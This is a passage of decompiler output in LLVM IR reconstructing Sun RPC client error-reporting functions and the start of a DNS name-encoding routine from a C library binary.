  uselistorder i32 3, { 2, 66, 67, 68, 69, 70, 71, 72, 73, 74, 3, 45, 46, 88, 4, 47, 48, 49, 0, 11, 27, 94, 29, 28, 19, 30, 75, 18, 76, 50, 51, 52, 12, 1, 92, 93, 5, 77, 78, 83, 84, 31, 85, 89, 24, 23, 32, 33, 34, 35, 36, 53, 96, 97, 103, 95, 59, 25, 65, 6, 7, 79, 8, 9, 90, 91, 109, 110, 111, 105, 106, 107, 108, 20, 87, 86, 80, 10, 21, 54, 101, 55, 13, 56, 99, 104, 100, 81, 37, 82, 14, 15, 102, 98, 57, 26, 16, 17, 58, 38, 39, 40, 41, 22, 60, 61, 42, 62, 63, 43, 64, 44 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 0, 7, 2, 9, 1, 8 }
  uselistorder i32 65536, { 3, 6, 4, 5, 7, 33, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 36, 34, 0, 38, 1, 35, 2, 37, 22, 23, 24, 26, 25, 27, 28, 31, 29, 32, 30 }
  uselistorder label %dec_label_pc_1001739c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_100172e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100172ac, { 1, 0 }
}

define i32 @__GI_clnt_sperrno() local_unnamed_addr {
entry:
  br label %dec_label_pc_100173dc

dec_label_pc_100173bc:                            ; preds = %dec_label_pc_100173dc
  %v1_100173e0 = add nuw nsw i32 %v0_100173dc, 1
  %v3_100173bc = inttoptr i32 %v2_100173e4 to i32*
  %v4_100173bc = load i32, i32* %v3_100173bc, align 4
  %v1_100173c0 = load i32, i32* @r3, align 4
  %v4_100173c0 = icmp eq i32 %v4_100173bc, %v1_100173c0
  br i1 %v4_100173c0, label %dec_label_pc_100173c8, label %dec_label_pc_100173dc

dec_label_pc_100173c8:                            ; preds = %dec_label_pc_100173bc
  %v1_100173c8 = add i32 %v1_100173dc, add (i32 ptrtoint (i32* @global_var_1001a3fc.620 to i32), i32 4)
  %v2_100173c8 = inttoptr i32 %v1_100173c8 to i32*
  %v3_100173c8 = load i32, i32* %v2_100173c8, align 4
  %v2_100173d4 = add i32 %v3_100173c8, ptrtoint ([13 x i8]* @global_var_1001a48c.621 to i32)
  ret i32 %v2_100173d4

dec_label_pc_100173dc:                            ; preds = %dec_label_pc_100173bc, %entry
  %v0_100173e8 = phi i32 [ %v1_100173e8, %dec_label_pc_100173bc ], [ 19, %entry ]
  %v0_100173dc = phi i32 [ %v1_100173e0, %dec_label_pc_100173bc ], [ 0, %entry ]
  %v1_100173dc = mul i32 %v0_100173dc, 8
  %v2_100173e4 = add i32 %v1_100173dc, ptrtoint (i32* @global_var_1001a3fc.620 to i32)
  store i32 %v2_100173e4, i32* @r10, align 4
  %v1_100173e8 = add nsw i32 %v0_100173e8, -1
  %v2_100173e8 = icmp eq i32 %v1_100173e8, 0
  br i1 %v2_100173e8, label %dec_label_pc_100173ec, label %dec_label_pc_100173bc

dec_label_pc_100173ec:                            ; preds = %dec_label_pc_100173dc
  ret i32 ptrtoint ([26 x i8]* @global_var_1001a204.622 to i32)

; uselistorder directives
  uselistorder i32 %v1_100173e8, { 1, 0 }
  uselistorder i32 %v2_100173e4, { 1, 0 }
  uselistorder i32* @r10, { 39, 66, 131, 132, 19, 68, 18, 69, 70, 71, 72, 73, 75, 74, 1, 76, 77, 78, 79, 80, 81, 82, 134, 135, 136, 141, 142, 36, 2, 6, 144, 143, 7, 47, 83, 20, 84, 85, 86, 41, 37, 38, 0, 40, 42, 43, 44, 140, 45, 25, 26, 27, 28, 29, 30, 46, 137, 138, 8, 87, 3, 88, 9, 89, 90, 91, 92, 93, 104, 105, 106, 5, 107, 108, 10, 58, 11, 59, 63, 64, 65, 60, 12, 61, 62, 100, 101, 102, 48, 49, 50, 147, 148, 145, 13, 146, 94, 21, 67, 109, 110, 95, 96, 97, 98, 99, 139, 153, 111, 112, 113, 115, 116, 117, 114, 23, 14, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 4, 24, 133, 152, 16, 17, 15, 149, 151, 150, 52, 51, 22, 53, 31, 32, 33, 34, 35, 54, 55, 56, 57, 103 }
  uselistorder i32 19, { 0, 4, 5, 6, 1, 7, 2, 3 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  store i32 268530696, i32* @lr, align 4
  %v0_10017404 = call i32 @__rpc_thread_variables()
  %v1_10017408 = add i32 %v0_10017404, 156
  %v2_10017408 = inttoptr i32 %v1_10017408 to i32*
  %v3_10017408 = load i32, i32* %v2_10017408, align 4
  store i32 %v3_10017408, i32* @r3, align 4
  store i32 268530704, i32* @lr, align 4
  %v0_1001740c = call i32 @free()
  ret i32 %v0_1001740c

; uselistorder directives
  uselistorder i32 ()* @free, { 48, 44, 45, 11, 10, 32, 31, 30, 29, 28, 27, 26, 25, 14, 43, 9, 47, 46, 13, 12, 8, 7, 6, 5, 4, 3, 2, 1, 24, 23, 22, 21, 20, 19, 18, 35, 34, 17, 0, 42, 41, 40, 39, 16, 38, 37, 36, 33, 15 }
}

define i32 @clnt_perrno() local_unnamed_addr {
entry:
  %v0_10017420 = load i32, i32* @lr, align 4
  %v0_10017430 = call i32 @__GI_clnt_sperrno()
  %v3_1001743c = load i32, i32* @global_var_1002ef8c, align 4
  store i32 %v0_10017420, i32* @lr, align 4
  %v3_1001744c = call i32 @__GI_fputs(i32 %v0_10017430, i32 %v3_1001743c, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  ret i32 %v3_1001744c
}

define i32 @_buf() local_unnamed_addr {
entry:
  %v0_10017458 = load i32, i32* @r31, align 4
  store i32 268530788, i32* @lr, align 4
  %v0_10017460 = call i32 @__rpc_thread_variables()
  %v1_10017464 = add i32 %v0_10017460, 156
  %v2_10017464 = inttoptr i32 %v1_10017464 to i32*
  %v3_10017464 = load i32, i32* %v2_10017464, align 4
  store i32 256, i32* @r3, align 4
  %v3_10017470 = icmp eq i32 %v3_10017464, 0
  br i1 %v3_10017470, label %dec_label_pc_10017478, label %dec_label_pc_10017480

dec_label_pc_10017478:                            ; preds = %entry
  store i32 268530812, i32* @lr, align 4
  %v0_10017478 = call i32 @malloc()
  %v1_1001747c = load i32, i32* @r31, align 4
  %v2_1001747c = add i32 %v1_1001747c, 156
  %v3_1001747c = inttoptr i32 %v2_1001747c to i32*
  store i32 %v0_10017478, i32* %v3_1001747c, align 4
  %v0_10017484.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10017480

dec_label_pc_10017480:                            ; preds = %entry, %dec_label_pc_10017478
  %v0_10017484 = phi i32 [ %v0_10017460, %entry ], [ %v0_10017484.pre, %dec_label_pc_10017478 ]
  %v1_10017484 = add i32 %v0_10017484, 156
  %v2_10017484 = inttoptr i32 %v1_10017484 to i32*
  %v3_10017484 = load i32, i32* %v2_10017484, align 4
  store i32 %v0_10017458, i32* @r31, align 4
  ret i32 %v3_10017484

; uselistorder directives
  uselistorder i32 ()* @malloc, { 22, 25, 2, 1, 12, 11, 5, 24, 23, 21, 4, 3, 20, 0, 13, 10, 9, 16, 6, 19, 18, 17, 15, 14, 8, 7 }
  uselistorder i32 256, { 56, 0, 1, 49, 2, 3, 4, 5, 50, 58, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 48, 22, 55, 57, 23, 24, 25, 26, 27, 28, 29, 62, 30, 63, 64, 65, 31, 32, 33, 34, 35, 59, 51, 36, 37, 60, 38, 39, 61, 40, 41, 42, 43, 44, 45, 46, 47, 66, 52, 53, 54 }
  uselistorder i32 156, { 1, 2, 3, 0, 4 }
  uselistorder i32 ()* @__rpc_thread_variables, { 13, 18, 6, 17, 16, 15, 14, 12, 2, 0, 4, 11, 3, 10, 1, 9, 5, 8, 7 }
  uselistorder label %dec_label_pc_10017480, { 1, 0 }
}

define i32 @clnt_spcreateerror() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-1048 = alloca i32, align 4
  %v0_100174a4 = load i32, i32* @r3, align 4
  store i32 %v0_100174a4, i32* @r29, align 4
  store i32 268530864, i32* @lr, align 4
  %v0_100174ac = call i32 @_buf()
  store i32 %v0_100174ac, i32* @r30, align 4
  %v3_100174b0 = icmp eq i32 %v0_100174ac, 0
  br i1 %v3_100174b0, label %dec_label_pc_100175a0, label %dec_label_pc_100174b8

dec_label_pc_100174b8:                            ; preds = %entry
  store i32 268530876, i32* @lr, align 4
  %v0_100174b8 = call i32 @__GI___rpc_thread_createerr()
  %v0_100174cc = load i32, i32* @r30, align 4
  store i32 %v0_100174cc, i32* @r3, align 4
  store i32 268530904, i32* @lr, align 4
  %v1_100174d4 = call i32 @sprintf(i32 %v0_100174cc)
  %v0_100174dc = load i32, i32* @r30, align 4
  %v2_100174dc = add i32 %v0_100174dc, %v1_100174d4
  store i32 %v2_100174dc, i32* %r29.global-to-local, align 4
  %v0_100174e0 = load i32, i32* @r31, align 4
  %v1_100174e0 = inttoptr i32 %v0_100174e0 to i32*
  %v2_100174e0 = load i32, i32* %v1_100174e0, align 4
  store i32 %v2_100174e0, i32* @r3, align 4
  %v0_100174e4 = call i32 @__GI_clnt_sperrno()
  %v2_100174f0 = inttoptr i32 %v0_100174e4 to i8*
  %v3_100174f0 = call i32 @strcpy(i32 %v2_100174dc, i8* %v2_100174f0)
  %v0_100174f4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100174f4, i32* @r3, align 4
  %v0_100174f8 = call i32 @__GI_strlen()
  %v0_100174fc = load i32, i32* @r31, align 4
  %v1_100174fc = inttoptr i32 %v0_100174fc to i32*
  %v2_100174fc = load i32, i32* %v1_100174fc, align 4
  %v2_10017504 = add i32 %v0_100174f4, %v0_100174f8
  store i32 %v2_10017504, i32* %r29.global-to-local, align 4
  %v3_10017508 = icmp eq i32 %v2_100174fc, 12
  br i1 %v3_10017508, label %dec_label_pc_10017558, label %dec_label_pc_1001751c

dec_label_pc_1001751c:                            ; preds = %dec_label_pc_100174b8
  %v3_10017514 = icmp eq i32 %v2_100174fc, 14
  br i1 %v3_10017514, label %dec_label_pc_10017528, label %dec_label_pc_10017590

dec_label_pc_10017528:                            ; preds = %dec_label_pc_1001751c
  %v4_10017528 = call i32 @strcpy(i32 %v2_10017504, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001a228.624, i32 0, i32 0))
  %v0_1001752c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1001752c, i32* @r3, align 4
  %v0_10017530 = call i32 @__GI_strlen()
  %v2_10017534 = add i32 %v0_1001752c, %v0_10017530
  store i32 %v2_10017534, i32* @r29, align 4
  %v0_10017538 = load i32, i32* @r31, align 4
  %v1_10017538 = add i32 %v0_10017538, 4
  %v2_10017538 = inttoptr i32 %v1_10017538 to i32*
  %v3_10017538 = load i32, i32* %v2_10017538, align 4
  store i32 %v3_10017538, i32* @r3, align 4
  %v0_1001753c = call i32 @__GI_clnt_sperrno()
  %v0_10017544 = load i32, i32* @r29, align 4
  %v2_10017548 = inttoptr i32 %v0_1001753c to i8*
  %v3_10017548 = call i32 @strcpy(i32 %v0_10017544, i8* %v2_10017548)
  %v0_1001754c = load i32, i32* @r29, align 4
  store i32 %v0_1001754c, i32* @r3, align 4
  %v0_10017550 = call i32 @__GI_strlen()
  br label %dec_label_pc_1001758c

dec_label_pc_10017558:                            ; preds = %dec_label_pc_100174b8
  %v2_100174d8 = ptrtoint i32* %stack_var_-1048 to i32
  %v4_10017558 = call i32 @strcpy(i32 %v2_10017504, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001a228.624, i32 0, i32 0))
  %v0_1001755c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1001755c, i32* @r3, align 4
  %v0_10017560 = call i32 @__GI_strlen()
  store i32 1024, i32* @r5, align 4
  %v2_10017568 = add i32 %v0_1001755c, %v0_10017560
  store i32 %v2_10017568, i32* %r29.global-to-local, align 4
  %v0_1001756c = load i32, i32* @r31, align 4
  %v1_1001756c = add i32 %v0_1001756c, 8
  %v2_1001756c = inttoptr i32 %v1_1001756c to i32*
  %v3_1001756c = load i32, i32* %v2_1001756c, align 4
  store i32 %v3_1001756c, i32* @r3, align 4
  store i32 268531064, i32* @lr, align 4
  %v3_10017574 = call i32 @__GI___glibc_strerror_r(i32 %v3_1001756c, i32 %v2_100174d8, i32 1024)
  %v0_10017578 = load i32, i32* @r29, align 4
  %v2_10017580 = bitcast i32* %stack_var_-1048 to i8*
  %v3_10017580 = call i32 @strcpy(i32 %v0_10017578, i8* %v2_10017580)
  %v0_10017584 = load i32, i32* @r29, align 4
  store i32 %v0_10017584, i32* @r3, align 4
  %v0_10017588 = call i32 @__GI_strlen()
  br label %dec_label_pc_1001758c

dec_label_pc_1001758c:                            ; preds = %dec_label_pc_10017528, %dec_label_pc_10017558
  %storemerge = phi i32 [ %v0_10017588, %dec_label_pc_10017558 ], [ %v0_10017550, %dec_label_pc_10017528 ]
  %v0_1001758c = load i32, i32* @r29, align 4
  %v2_1001758c = add i32 %v0_1001758c, %storemerge
  store i32 %v2_1001758c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10017590

dec_label_pc_10017590:                            ; preds = %dec_label_pc_1001751c, %dec_label_pc_1001758c
  %v2_10017594 = phi i32 [ %v2_10017504, %dec_label_pc_1001751c ], [ %v2_1001758c, %dec_label_pc_1001758c ]
  %v3_10017594 = add i32 %v2_10017594, 1
  %v4_10017594 = inttoptr i32 %v3_10017594 to i8*
  store i8 0, i8* %v4_10017594, align 1
  %v2_1001759c = load i32, i32* %r29.global-to-local, align 4
  %v3_1001759c = inttoptr i32 %v2_1001759c to i8*
  store i8 10, i8* %v3_1001759c, align 1
  %v0_100175a4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100175a0

dec_label_pc_100175a0:                            ; preds = %entry, %dec_label_pc_10017590
  %v0_100175a4 = phi i32 [ 0, %entry ], [ %v0_100175a4.pre, %dec_label_pc_10017590 ]
  ret i32 %v0_100175a4

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 2, 0, 1, 4, 3, 5, 6, 7 }
  uselistorder i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001a228.624, i32 0, i32 0), { 1, 0 }
  uselistorder i32 14, { 3, 9, 10, 11, 1, 2, 12, 0, 8, 4, 5, 6, 7 }
  uselistorder i32 12, { 40, 130, 131, 101, 102, 103, 0, 104, 105, 106, 14, 41, 47, 134, 25, 42, 43, 44, 45, 113, 46, 143, 15, 137, 144, 6, 145, 10, 11, 12, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 138, 132, 133, 48, 51, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 139, 62, 63, 37, 17, 140, 18, 141, 142, 22, 64, 65, 66, 114, 119, 120, 121, 122, 123, 124, 125, 126, 5, 7, 127, 135, 136, 150, 67, 90, 117, 68, 152, 153, 154, 155, 4, 146, 1, 2, 3, 19, 20, 13, 107, 108, 109, 110, 168, 111, 128, 129, 115, 116, 89, 86, 164, 165, 157, 158, 159, 160, 78, 161, 8, 69, 70, 71, 72, 73, 38, 74, 75, 76, 77, 79, 151, 166, 156, 80, 118, 21, 23, 24, 81, 149, 82, 148, 147, 167, 163, 162, 83, 84, 85, 39, 9, 87, 88, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 112 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100175a0, { 1, 0 }
  uselistorder label %dec_label_pc_10017590, { 1, 0 }
  uselistorder label %dec_label_pc_1001758c, { 1, 0 }
}

define i32 @clnt_pcreateerror() local_unnamed_addr {
entry:
  %v0_100175b8 = load i32, i32* @lr, align 4
  store i32 268531148, i32* @lr, align 4
  %v0_100175c8 = call i32 @clnt_spcreateerror()
  %v3_100175d4 = load i32, i32* @global_var_1002ef8c, align 4
  store i32 %v0_100175b8, i32* @lr, align 4
  %v3_100175e4 = call i32 @__GI_fputs(i32 %v0_100175c8, i32 %v3_100175d4, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  ret i32 %v3_100175e4
}

define i32 @__GI_clnt_sperror() local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1052 = alloca i32, align 4
  %stack_var_-1064 = alloca i32, align 4
  %v0_100175f4 = load i32, i32* @r3, align 4
  store i32 %v0_100175f4, i32* @r31, align 4
  %v0_100175fc = load i32, i32* @r4, align 4
  store i32 %v0_100175fc, i32* @r30, align 4
  store i32 268531204, i32* @lr, align 4
  %v0_10017600 = call i32 @_buf()
  store i32 %v0_10017600, i32* %r28.global-to-local, align 4
  %v3_10017604 = icmp eq i32 %v0_10017600, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10017604, label %dec_label_pc_100177b0, label %dec_label_pc_10017610

dec_label_pc_10017610:                            ; preds = %entry
  %v0_10017610 = load i32, i32* @r31, align 4
  %v1_10017610 = add i32 %v0_10017610, 4
  %v2_10017610 = inttoptr i32 %v1_10017610 to i32*
  %v3_10017610 = load i32, i32* %v2_10017610, align 4
  store i32 %v0_10017610, i32* %r3.global-to-local, align 4
  %v1_1001761c = add i32 %v3_10017610, 8
  %v2_1001761c = inttoptr i32 %v1_1001761c to i32*
  %v3_1001761c = load i32, i32* %v2_1001761c, align 4
  call void @__pseudo_call(i32 %v3_1001761c)
  %v0_10017634 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10017634, i32* @r3, align 4
  store i32 268531264, i32* @lr, align 4
  %v1_1001763c = call i32 @sprintf(i32 %v0_10017634)
  %v0_10017640 = load i32, i32* @r28, align 4
  %v2_10017640 = add i32 %v0_10017640, %v1_1001763c
  store i32 %v2_10017640, i32* %r29.global-to-local, align 4
  %v3_10017644 = load i32, i32* %stack_var_-1064, align 4
  store i32 %v3_10017644, i32* @r3, align 4
  %v0_10017648 = call i32 @__GI_clnt_sperrno()
  store i32 %v2_10017640, i32* %r3.global-to-local, align 4
  %v2_10017654 = inttoptr i32 %v0_10017648 to i8*
  %v3_10017654 = call i32 @strcpy(i32 %v2_10017640, i8* %v2_10017654)
  %v0_10017658 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10017658, i32* @r3, align 4
  %v0_1001765c = call i32 @__GI_strlen()
  store i32 %v0_1001765c, i32* %r3.global-to-local, align 4
  %v3_10017660 = load i32, i32* %stack_var_-1064, align 4
  %v2_10017664 = add i32 %v0_10017658, %v0_1001765c
  store i32 %v2_10017664, i32* %r31.global-to-local, align 4
  %v2_10017668 = icmp ugt i32 %v3_10017660, 17
  br i1 %v2_10017668, label %dec_label_pc_1001777c, label %dec_label_pc_10017670

dec_label_pc_10017670:                            ; preds = %dec_label_pc_10017610
  %v1_10017674 = mul i32 %v3_10017660, 4
  %v2_1001767c = add i32 %v1_10017674, ptrtoint (i32* @global_var_1001a2ac.626 to i32)
  %v3_1001767c = inttoptr i32 %v2_1001767c to i32*
  %v4_1001767c = load i32, i32* %v3_1001767c, align 4
  %v2_10017680 = add i32 %v4_1001767c, ptrtoint (i32* @global_var_1001a2ac.626 to i32)
  call void @__pseudo_branch(i32 %v2_10017680)
  %v2_1001768c = ptrtoint i32* %stack_var_-1052 to i32
  store i32 %v2_1001768c, i32* %r29.global-to-local, align 4
  store i32 %tmp4, i32* @r3, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268531360, i32* @lr, align 4
  %v3_1001769c = call i32 @__GI___glibc_strerror_r(i32 %tmp4, i32 %v2_1001768c, i32 1024)
  %v0_100176ac = load i32, i32* @r31, align 4
  store i32 %v0_100176ac, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100176b8.628 to i32), i32* @lr, align 4
  %v1_100176b4 = call i32 @sprintf(i32 %v0_100176ac)
  br label %dec_label_pc_10017798

dec_label_pc_1001777c:                            ; preds = %dec_label_pc_10017610
  store i32 %v2_10017664, i32* @r3, align 4
  store i32 268531608, i32* @lr, align 4
  %v1_10017794 = call i32 @sprintf(i32 %v2_10017664)
  br label %dec_label_pc_10017798

dec_label_pc_10017798:                            ; preds = %dec_label_pc_10017670, %dec_label_pc_1001777c
  %storemerge = phi i32 [ %v1_10017794, %dec_label_pc_1001777c ], [ %v1_100176b4, %dec_label_pc_10017670 ]
  %v0_10017798 = load i32, i32* @r31, align 4
  %v2_10017798 = add i32 %v0_10017798, %storemerge
  store i32 %v2_10017798, i32* %r31.global-to-local, align 4
  %v0_100177a0 = load i32, i32* @r28, align 4
  store i32 %v0_100177a0, i32* %r3.global-to-local, align 4
  %v3_100177a4 = add i32 %v2_10017798, 1
  %v4_100177a4 = inttoptr i32 %v3_100177a4 to i8*
  store i8 0, i8* %v4_100177a4, align 1
  %v2_100177ac = load i32, i32* %r31.global-to-local, align 4
  %v3_100177ac = inttoptr i32 %v2_100177ac to i8*
  store i8 10, i8* %v3_100177ac, align 1
  %v0_100177c0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100177b0

dec_label_pc_100177b0:                            ; preds = %entry, %dec_label_pc_10017798
  %v0_100177c0 = phi i32 [ 0, %entry ], [ %v0_100177c0.pre, %dec_label_pc_10017798 ]
  ret i32 %v0_100177c0

; uselistorder directives
  uselistorder i32 %v2_10017664, { 1, 0, 2 }
  uselistorder i32 %v2_10017640, { 1, 0, 2 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 2, 0, 1 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 2, 13, 1, 15, 3, 4, 16, 20, 18, 19, 17, 0, 14, 5, 6, 7, 8, 9, 11, 12, 10 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 2, 0, 3 }
  uselistorder i32 17, { 14, 0, 3, 1, 4, 5, 20, 6, 15, 16, 17, 18, 7, 8, 9, 10, 11, 2, 23, 24, 21, 22, 19, 12, 13 }
  uselistorder i32 (i32, i8*)* @strcpy, { 7, 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 ()* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32)* @sprintf, { 2, 5, 1, 4, 3, 0 }
  uselistorder i32 4, { 6, 274, 224, 157, 371, 7, 8, 454, 455, 9, 134, 158, 10, 11, 374, 372, 373, 177, 375, 376, 377, 150, 12, 378, 379, 380, 381, 382, 383, 384, 13, 385, 14, 15, 162, 386, 387, 178, 388, 389, 390, 275, 276, 456, 457, 173, 263, 208, 16, 17, 279, 18, 19, 151, 339, 20, 21, 22, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 24, 23, 25, 26, 464, 465, 466, 467, 468, 469, 408, 235, 236, 474, 475, 179, 27, 28, 490, 491, 492, 493, 29, 301, 30, 180, 31, 32, 140, 33, 34, 35, 36, 37, 38, 391, 392, 181, 39, 40, 209, 167, 210, 168, 211, 169, 212, 170, 476, 237, 283, 458, 459, 460, 461, 462, 41, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 480, 481, 482, 260, 261, 262, 477, 478, 479, 42, 43, 264, 265, 266, 267, 268, 269, 270, 271, 272, 44, 273, 45, 46, 47, 48, 277, 278, 499, 49, 137, 280, 281, 282, 50, 498, 463, 284, 285, 483, 286, 287, 288, 289, 290, 291, 51, 292, 484, 485, 486, 182, 213, 214, 160, 215, 216, 217, 218, 219, 159, 0, 220, 221, 293, 487, 174, 488, 489, 196, 197, 198, 52, 294, 295, 296, 297, 298, 299, 300, 500, 3, 53, 1, 470, 4, 54, 2, 393, 183, 55, 409, 410, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 471, 472, 509, 436, 141, 541, 548, 56, 57, 58, 59, 60, 341, 342, 61, 343, 62, 344, 63, 510, 64, 302, 65, 66, 303, 67, 353, 354, 355, 417, 418, 419, 68, 304, 69, 70, 71, 305, 72, 306, 307, 516, 518, 517, 514, 515, 501, 502, 503, 504, 519, 520, 521, 505, 506, 494, 495, 175, 394, 184, 395, 396, 142, 73, 74, 397, 75, 398, 399, 400, 401, 402, 403, 152, 76, 404, 532, 533, 437, 77, 78, 79, 153, 80, 171, 81, 154, 155, 82, 166, 473, 83, 84, 542, 543, 544, 185, 545, 546, 547, 85, 534, 535, 536, 138, 139, 537, 538, 186, 539, 540, 86, 405, 87, 88, 89, 90, 91, 92, 93, 438, 94, 439, 440, 163, 441, 442, 443, 444, 445, 95, 96, 446, 447, 164, 448, 449, 165, 450, 451, 453, 97, 98, 135, 136, 452, 411, 99, 412, 187, 413, 345, 346, 347, 172, 5, 348, 349, 350, 414, 415, 337, 314, 522, 523, 100, 101, 102, 161, 103, 143, 104, 144, 308, 309, 105, 176, 106, 107, 108, 497, 109, 110, 496, 111, 310, 311, 312, 313, 315, 316, 317, 511, 512, 513, 112, 113, 114, 529, 530, 524, 420, 156, 422, 115, 199, 200, 201, 202, 203, 204, 205, 206, 116, 207, 117, 319, 318, 222, 320, 321, 322, 525, 526, 527, 421, 508, 507, 531, 528, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 423, 336, 338, 424, 188, 118, 119, 340, 120, 121, 122, 123, 124, 145, 125, 126, 127, 189, 128, 146, 147, 190, 129, 351, 352, 356, 357, 191, 358, 359, 360, 192, 361, 130, 362, 363, 364, 193, 365, 366, 367, 368, 369, 370, 406, 194, 407, 148, 131, 416, 149, 132, 425, 133, 223, 195 }
  uselistorder label %dec_label_pc_100177b0, { 1, 0 }
  uselistorder label %dec_label_pc_10017798, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_100177c4 = load i32, i32* @lr, align 4
  store i32 268531672, i32* @lr, align 4
  %v0_100177d4 = call i32 @__GI_clnt_sperror()
  %v3_100177e0 = load i32, i32* @global_var_1002ef8c, align 4
  store i32 %v0_100177c4, i32* @lr, align 4
  %v3_100177f0 = call i32 @__GI_fputs(i32 %v0_100177d4, i32 %v3_100177e0, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  ret i32 %v3_100177f0

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__GI_fputs, { 4, 6, 5, 3, 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10030000.11 to i32), { 5, 6, 7, 8, 9, 37, 38, 39, 1, 2, 40, 41, 4, 3, 42, 43, 10, 44, 45, 11, 12, 46, 13, 27, 0, 47, 14, 28, 15, 48, 16, 29, 30, 49, 50, 51, 31, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 32, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77, 78, 17, 79, 80, 81, 82, 83, 84, 85, 18, 86, 33, 75, 87, 88, 89, 90, 34, 91, 92, 93, 94, 95, 96, 97, 19, 20, 21, 98, 22, 99, 100, 101, 35, 102, 103, 36, 23, 104, 105, 106, 107, 24, 25, 26 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100177f8 = load i32, i32* @lr, align 4
  store i32 %v0_100177f8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10017804 = load i32, i32* @r4, align 4
  store i32 %v0_10017804, i32* @r29, align 4
  %v0_10017808 = load i32, i32* @r5, align 4
  store i32 %v0_10017808, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001787413 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001787413, label %dec_label_pc_10017890, label %dec_label_pc_10017884

dec_label_pc_10017818:                            ; preds = %dec_label_pc_10017884
  store i32 268531740, i32* @lr, align 4
  %v3_10017818 = call i32 @__GI_strchr(i32 %v0_1001788414, i32 46)
  store i32 %v3_10017818, i32* @r30, align 4
  %v3_1001781c = icmp eq i32 %v3_10017818, 0
  %v0_10017820 = load i32, i32* @r31, align 4
  store i32 %v0_10017820, i32* @r3, align 4
  %v2_10017824 = sub i32 %v3_10017818, %v0_10017820
  store i32 %v2_10017824, i32* %r0.global-to-local, align 4
  br i1 %v3_1001781c, label %dec_label_pc_1001782c, label %dec_label_pc_10017834

dec_label_pc_1001782c:                            ; preds = %dec_label_pc_10017818
  %v0_1001782c = call i32 @__GI_strlen()
  store i32 %v0_1001782c, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1001782c, 16777216
  %v1_10017830 = sdiv i32 %sext, 16777216
  store i32 %v1_10017830, i32* %r0.global-to-local, align 4
  %v0_10017844.pre = load i32, i32* @r31, align 4
  %v0_10017854.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10017834

dec_label_pc_10017834:                            ; preds = %dec_label_pc_10017818, %dec_label_pc_1001782c
  %v0_10017854 = phi i32 [ %v3_10017818, %dec_label_pc_10017818 ], [ %v0_10017854.pre, %dec_label_pc_1001782c ]
